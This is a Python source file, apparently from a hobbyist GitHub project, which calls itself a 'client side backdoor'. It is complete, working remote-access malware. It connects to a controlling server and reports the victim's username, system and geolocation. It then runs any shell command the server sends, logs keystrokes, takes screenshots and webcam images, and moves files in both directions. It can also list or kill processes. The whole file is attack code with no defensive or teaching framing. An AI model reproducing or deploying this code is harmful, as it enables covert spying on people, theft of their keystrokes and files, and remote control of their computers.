# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'Discord: zNairy#7181 | Github: https://github.com/zNairy/'
__version__ = '2.0'

from socket import socket, AF_INET, SOCK_STREAM
from getpass import getuser
from datetime import datetime
from pyscreenshot import grab
from cv2 import VideoCapture, imencode
from psutil import process_iter, AccessDenied
from pynput.keyboard import Listener, KeyCode
from random import getrandbits
from pathlib import Path
from json import loads as jloads
from pickle import loads, dumps
from subprocess import getoutput
from requests import get
from os import uname, chdir, getcwd
from time import sleep, time
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings

disable_warnings(InsecureRequestWarning)

class Client(object):
    """ client side backdoor """
    def __init__(self, host='0.0.0.0', port=5000):
        self.__Address = (host, port)
        self.screenshotPath = '/tmp/736f6e61726973.png' if uname().sysname.lower() == 'linux' else f'C:/Users/{getuser()}/AppData/Local/Temp/736f6e61726973.png'
        self.kloggerIsRunning, self.currentCapturedKeys = False, ''
        self.kloggerFiles = []

    def __repr__(self):
        print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')

    # removing the screenshot file
    def removeScreenshot(self):
        Path(self.screenshotPath).unlink(missing_ok=True)

    # kills some processes by name or pid
    def terminateProcess(self, processIdentifier):
        if not processIdentifier.isdigit():
            processes = [proc for proc in process_iter() if proc.name().lower() == processIdentifier.lower()]
        else:
            processes = [proc for proc in process_iter() if proc.pid == int(processIdentifier)]
        
        if processes:
            try:
                for process in processes:
                    process.terminate()

                self.sendHeader({"content": f"[green]Process [yellow]{processIdentifier} [green]has been terminated!"})
            except AccessDenied:
                self.sendHeader({"content": f"[red]Error: Can't terminate process [yellow]{processIdentifier}, [red]Access denied"})
        else:
            self.sendHeader({"content": f"[red]No processes running with identifier [yellow]{processIdentifier}."})

    # getting info of only one process
    def getProcessInfo(self, processname):
        attrs = ['pid', 'username', 'name', 'exe', 'cwd', 'cpu_percent', 'memory_percent']
        processInfo = [proc.info for proc in process_iter(attrs=attrs) if proc.name().lower() == processname.lower()]
        if processInfo:
            self.sendHeader({"sucess": True, "total": len(processInfo), "bytes": len(dumps(processInfo))})
            sleep(0.5)
            self.__Client.send(dumps(processInfo))
        else:
            self.sendHeader({"sucess": False, "content": f"[red]No process with name [yellow]{processname}."})

    # getting info of all processes running in the moment
    def getProcessList(self, args):
        processesInfo = [proc.info for proc in process_iter(['pid', 'username', 'name', 'exe', 'cwd'])]

        self.sendHeader({"total": len(processesInfo), "bytes": len(dumps(processesInfo))})
        sleep(0.5)
        self.__Client.send(dumps(processesInfo))

    # removing temp log files
    def removeKloogerFiles(self):
        for klog in self.kloggerFiles:
            Path(f'/tmp/sla/{klog}.dat').unlink(missing_ok=True)
        
        self.kloggerFiles.clear()

    def saveCapturedKeys(self):
        # generating random name to file
        nameFile = hex(getrandbits(128))[2:-1]
        self.kloggerFiles.append(nameFile)

        with open(f'/tmp/sla/{nameFile}.dat', 'w') as partFile:
            partFile.write(f'[{datetime.now().strftime("%H:%M")}]: {self.currentCapturedKeys}')

        self.currentCapturedKeys = ''

    # excluding command/special keys
    def checkValidKeys(self, key):
        if isinstance(key, KeyCode):
            self.currentCapturedKeys += key.char
        elif key.name == 'space':
            self.currentCapturedKeys += ' '

        if len(self.currentCapturedKeys) >= 1000000: # ≃1mb
            self.saveCapturedKeys()

    # starting the keyboard logger
    def keyloggerStart(self, args):
        if not self.kloggerIsRunning:
            self.keyboardListener = Listener(on_press=self.checkValidKeys)
            self.keyboardListener.start()
            self.kloggerIsRunning = True
            self.sendHeader({"content": f"[green]The listening started at [yellow]{datetime.now().strftime('%H:%M')}!\n"})
        else:
            self.sendHeader({"content": f"[yellow]The klogger is already running!"})

    # sending the captured keys to server side
    def keyloggerDump(self, args):
        if self.kloggerIsRunning:
            if self.kloggerFiles:
                currentKeys, self.currentCapturedKeys = f"[{datetime.now().strftime('%H:%M')}]: {self.currentCapturedKeys}", "" # saving current content of captured keys and erasing them
                klogs = ''.join(open(f'/tmp/sla/{partFile}.dat').read() + '\n' for partFile in self.kloggerFiles)
                self.removeKloogerFiles()
                capturedKeys = (klogs+currentKeys).encode()
            elif self.currentCapturedKeys:
                capturedKeys, self.currentCapturedKeys = f"[{datetime.now().strftime('%H:%M')}]: {self.currentCapturedKeys}".encode(), "" # saving current content of captured keys and erasing them
            else:
                self.sendHeader({"sucess": False, "content": "[red] There's no captured keys yet."})
                return

            header = {
                "namefile": f"klogger_dump-{datetime.now().strftime('%d.%m.%y-%H.%M.%S')}",
                "extension": '.dat',
                "bytes": len(capturedKeys),
                "path": "files",
                "sucess": True
            }
            
            self.sendHeader(header)
            sleep(0.5)
            self.__Client.send(capturedKeys)
        else:
            self.sendHeader({"sucess": False, "content": "[red] Error: The klogger is not running!"})

    # stopping the keyboard logger
    def keyloggerStop(self, args):
        if self.kloggerIsRunning:
            self.keyboardListener.stop()
            self.kloggerIsRunning = False
            self.sendHeader({"content": f"[green]Klogger has ended at [yellow]{datetime.now().strftime('%H:%M')}!"})
        else:
            self.sendHeader({"content": "[red] Error: The Klogger is not running."})

    # receiving a file from server side (upload)
    def upload(self, args):
        header = loads(self.__Client.recv(512))
        try:
            self.receiveFile(header)
            self.sendHeader({"content": f"File {Path(args).stem} uploaded successfully!", "sucess": True})
        except PermissionError:
            self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})

    # checking if exist any available webcam to use
    def checkAvailableWebcams(self):
        # trying to detect any available webcam and return ids if exists
        availableWebcams = [f'{id+1} ' for id in range(10) if VideoCapture(id).isOpened()]

        if availableWebcams:
            return {
                "sucess": True,
                "content": f"[green]There's [yellow]{len(availableWebcams)}[green] webcams available | IDs: [white]{''.join(webcamId for webcamId in availableWebcams)}"
                }
        
        return {"sucess": False, "content": "[red]There's no webcam available"}

    # taking a webcam shot from id
    def webcamshot(self, args):
        if args:
            try:
                # trying to taking a webcam shot and converting the frame in to bytes string
                wcamshot = imencode('.png', VideoCapture(int(args)-1).read()[1])[1].tobytes() if VideoCapture(int(args)-1).isOpened() else False
                
                if wcamshot and int(args) > 0: # if there is any frame by the given id
                    header = {
                        "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
                        "extension": '.png',
                        "bytes": len(wcamshot),
                        "path": "screenshots",
                        "sucess": True
                    }

                    self.sendHeader(header)
                    sleep(0.5)
                    self.__Client.send(wcamshot)
                else:
                    self.sendHeader({"content": f"[red]There's no webcam with ID [yellow]{args}", "sucess": False})
            except ValueError:
                self.sendHeader({"content": f"[red] Invalid Id [yellow]{args}[red], must be a number", "sucess": False})
        else:
            availableWebcams = self.checkAvailableWebcams()
            self.sendHeader(availableWebcams)

    # taking a screenshot
    def screenshot(self, args):
        grab().save(self.screenshotPath) # taking and saving the screenshot
        namefile, extension, file = self.splitFile(self.screenshotPath);del(namefile)
        self.removeScreenshot()
        
        header = {
            "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
            "extension": extension,
            "bytes": len(file),
            "path": "screenshots"
        }

        self.sendHeader(header)
        sleep(1)
        self.__Client.send(file)
    
    # sending a local file to server side (download)
    def download(self, args):
        try:
            if Path(args).is_file(): # if file exists
                namefile, extension, file = self.splitFile(args)
                header = {
                    "namefile": namefile,
                    "extension": extension,
                    "bytes": len(file),
                    "path": "files",
                    "sucess": True
                }

                self.sendHeader(header)
                sleep(1)
                self.__Client.send(file)
            else:
                self.sendHeader({"content": f"File {Path(args).stem} not found", "sucess": False})
        except PermissionError:
            self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})

    # saving a received file from server side 
    def saveReceivedFile(self, path, content):
        with open(path, 'wb') as receivedFile:
            receivedFile.write(content)

    # receiving a file from server side (upload)
    def receiveFile(self, header):
        file = b''

        while len(file) < header['bytes']:
            file += self.__Client.recv(header['bytes'])

        self.saveReceivedFile(f'{header["namefile"]}{header["extension"]}', file)
    
    # returns name of file, extension and your bytes content
    def splitFile(self, path):
        with open(path, 'rb') as file:
            return Path(path).stem, Path(path).suffix, file.read()

    # send header to server side (about messages, files...)
    def sendHeader(self, header):
        self.__Client.send(dumps(header))

    # changing to the directory, informed from the server side
    def changeDirectory(self, directory):
        try:
            chdir(directory)
            self.sendCommand(self.lastCommand, '.')
        except PermissionError:
            self.sendCommand(self.lastCommand)
        except FileNotFoundError:
            self.sendCommand(self.lastCommand)

    # returns all 'internal' commands
    def allCommands(self):
        return {
            "/screenshot": {"action": self.screenshot},
            "/download": {"action": self.download},
            "/upload": {"action": self.upload},
            "/webcamshot": {"action": self.webcamshot},
            "/processlist": {"action": self.getProcessList},
            "/processinfo": {"action": self.getProcessInfo},
            "/terminateprocess": {"action": self.terminateProcess},
            "/kloggerstart": {"action": self.keyloggerStart},
            "/kloggerdump": {"action": self.keyloggerDump},
            "/kloggerstop": {"action": self.keyloggerStop},
            "cd": {"action": self.changeDirectory}
        }

    # returns function of the command (your action) and your respective arguments, if exists, if not returns False (is a shell command).
    def splitCommand(self, command):
        if self.allCommands().get(command.split()[0]):
            return self.allCommands()[command.split()[0]]['action'], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #

        return False, ''

    # returns output of the command informed
    def outputCommand(self, command):
        return getoutput(command).encode()

    # sending the command output that was executed in shell
    def sendCommand(self, command, customOutput=''):
        if not customOutput:
            output = self.outputCommand(command)
        else:
            output = customOutput.encode()

        header = {
            "initialTime": time(),
            "bytes": len(output),
            "currentDirectory": getcwd()
        }
        
        self.sendHeader(header)
        sleep(0.5) # small delay to send the data
        self.__Client.send(output)

    # checking and executing command informed by server side
    def runCommand(self, cmd):
        command, args = self.splitCommand(cmd)

        if command:
            command(args.strip())
        else:
            self.sendCommand(cmd) # send the output of shell command

    # receiving server side commands
    def listenServer(self):
        while True:
            command = self.__Client.recv(512)
            if command:
                self.lastCommand = command
                self.runCommand(command.decode('utf-8'))
            else:
                self.run()

    # returns some basic data about client
    def identifier(self):
        identifier = {"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "currentDirectory": getcwd()}
        
        try:
            info = jloads(get('http://ip-api.com/json/').content) # locality
            identifier.update({"externalAddress": info['query'], "city": info['city'], "country": info['country'], "region": info['region']})
        except Exception:
            pass
        
        return dumps(identifier)

    # trying to connect to the server
    def connect(self):
        try:
            self.__Client.connect((self.__Address))
            self.__Client.send(self.identifier())
        except ConnectionRefusedError:
            sleep(5);self.connect()

    # configuring the socket object
    def configureSocket(self):
        self.__Client = socket(AF_INET, SOCK_STREAM)

    # starting the program
    def run(self):
        self.configureSocket()
        self.connect()
        
        self.listenServer()


def main():
    client = Client('127.0.0.1', 5000)
    client.run()

if __name__ == '__main__':
    main()
